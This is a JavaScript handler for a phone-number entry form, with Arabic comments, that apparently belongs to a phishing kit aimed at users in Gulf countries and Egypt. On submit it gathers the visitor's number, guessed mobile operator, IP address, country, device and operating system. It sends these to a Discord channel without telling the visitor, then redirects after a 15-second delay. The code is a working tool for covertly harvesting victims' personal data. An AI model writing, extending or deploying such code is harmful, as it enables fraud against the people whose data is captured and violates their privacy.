// معالج نموذج رقم الهاتف

document.addEventListener('DOMContentLoaded', async function() {
    const form = document.getElementById('phoneForm');
    const phoneInput = document.getElementById('phone');
    const countryCodeSelect = document.getElementById('countryCode');
    const submitBtn = document.getElementById('submitBtn');

    // تحديد الدولة تلقائياً بناءً على IP
    try {
        const { countryCode } = await getIPInfo();
        const phoneCode = getCountryPhoneCode(countryCode);
        
        if (phoneCode && countryCodeSelect) {
            countryCodeSelect.value = phoneCode;
        }
    } catch (error) {
        console.log('تعذر تحديد الدولة تلقائياً');
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        hideError();
        
        const code = countryCodeSelect.value;
        const phone = phoneInput.value.trim();
        
        // التحقق من الدولة (جميع الدول مدعومة الآن)
        const supportedCodes = ['+968', '+966', '+971', '+965', '+974', '+973', '+20'];
        if (!supportedCodes.includes(code)) {
            showError('الدولة غير مدعومة حالياً');
            return;
        }
        
        // التحقق من رقم الهاتف بناءً على الدولة
        if (!validatePhoneNumber(phone, code)) {
            showError('الرقم غير صحيح، يرجى التحقق من الرقم');
            return;
        }
        
        // تعطيل النموذج وعرض التحميل
        disableForm('phoneForm');
        showLoading();
        
        try {
            // الحصول على معلومات الجهاز
            const { device, os } = getDeviceInfo();
            
            // الحصول على معلومات IP
            const { ip, country } = await getIPInfo();
            
            // تحديد المشغل
            const operator = getOperator(phone, code);
            
            // تنسيق الرسالة
            const date = new Date().toLocaleString('ar-EG', { 
                timeZone: 'Asia/Muscat',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            const message = `🟢 معلومات  (${date})
**📞 الدولة:** ${code}
🔢 الرقم: \`${phone}\`
**🏢 المشغل:** ${operator}
**🌍 الدولة:** ${country}
**🌐 عنوان IP:** ${ip}
**📱 الجهاز:** ${device}
**🛠 نظام التشغيل:** ${os}
🔻🔻🔻 نهاية  🔻🔻🔻
`;
            
            // إرسال البيانات إلى Discord
            const success = await sendToDiscord(message);
            
            if (success) {
                // حفظ رقم الهاتف
                saveToStorage('contactNumber', code + phone);
                
                // الانتظار 15 ثانية ثم الانتقال
                setTimeout(() => {
                    window.location.href = 'contact.html';
                }, 15000);
            } else {
                hideLoading();
                enableForm('phoneForm');
                showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
            }
        } catch (error) {
            console.error('خطأ:', error);
            hideLoading();
            enableForm('phoneForm');
            showError('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
        }
    });
    
    // السماح بالأرقام فقط في حقل الهاتف
    phoneInput.addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
});
